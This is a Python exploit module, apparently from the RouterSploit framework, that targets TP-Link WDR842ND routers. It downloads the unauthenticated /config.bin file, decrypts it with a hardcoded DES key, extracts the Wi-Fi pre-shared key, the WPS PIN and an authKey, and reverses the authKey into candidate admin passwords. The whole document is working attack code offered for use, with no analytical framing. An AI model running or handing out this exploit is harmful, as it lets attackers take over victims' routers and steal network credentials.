# rsf exploit module
# description: TP-Link WDR842ND Configure Disclosure
from Crypto.Cipher import DES
import requests

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 80

    def http_request(self, method, path):
        url = f"http://{self.target}:{self.port}{path}"
        try:
            response = requests.get(url, timeout=10)
            return response
        except:
            return None

    def decrypt_authKey(self, authKey):
        matrix = [[0 for _ in range(15)] for _ in range(15)]
        strDe = "RDpbLfCPsJZ7fiv"
        dic = ("yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD"
               "02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV5"
               "7fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oB"
               "wmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW")

        passwd = ''
        for crIndex in range(0, 15):
            passwdList = ''
            strComp_authkey = authKey[crIndex]
            codeCr = ord(strDe[crIndex])
            for index in range(32, 127):
                strtmp = chr(index)
                codeCl = ord(strtmp[0])
                strDic = dic[(codeCl ^ codeCr) % 255]
                if strComp_authkey == strDic:
                    passwdList += strtmp
            matrix[crIndex] = passwdList

        passwdLen = 0
        for i in range(0, 15):
            if len(matrix[i]) == 0:
                passwdLen = i
                break
            elif i == 14:
                passwdLen = 15
        for i in range(0, passwdLen):
            passwd += matrix[i] + '\n'
        return passwd

    def parse(self, data):
        parts = data.split(b'\r\n')
        del parts[0]
        authKey, cPskSecret, cUsrPIN = "", "", ""
        for item in parts:
            try:
                if b'authKey' in item:
                    authKey = item.split()[1].decode()
                if b'cPskSecret' in item:
                    cPskSecret = item.split()[1].decode()
                if b'cUsrPIN' in item:
                    cUsrPIN = item.split()[1].decode()
            except:
                pass
        return authKey, cPskSecret, cUsrPIN

    def decrypt_config_bin(self, data):
        key = b"\x47\x8D\xA5\x0B\xF9\xE3\xD2\xCF"
        crypto = DES.new(key, DES.MODE_ECB)
        data_decrypted = crypto.decrypt(data).rstrip(b'\0')
        return self.parse(data_decrypted)

    def check(self):
        response = self.http_request("GET", "/config.bin")
        if response is None:
            return False
        return (response.status_code == 200 and 
                'x-bin/octet-stream' in response.headers.get('Content-Type', ''))

    def run(self):
        if self.check():
            print("[+] Target is vulnerable")
            print("[*] Sending payload request")
            response = self.http_request("GET", "/config.bin")
            if response is not None and response.status_code == 200:
                print("[+] Exploit success")
                print("[*] Reading file config.bin")
                authKey, cPskSecret, cUsrPIN = self.decrypt_config_bin(response.content)
                password = self.decrypt_authKey(authKey)
                print(f"[+] Found cPskSecret: {cPskSecret}")
                print(f"[+] Found cUsrPIN: {cUsrPIN}")
                print(f"[+] Found authKey: {authKey}")
                print("[+] Password combination from top to bottom:\n" + password)
        else:
            print("[-] Exploit failed. Device seems to be not vulnerable.")
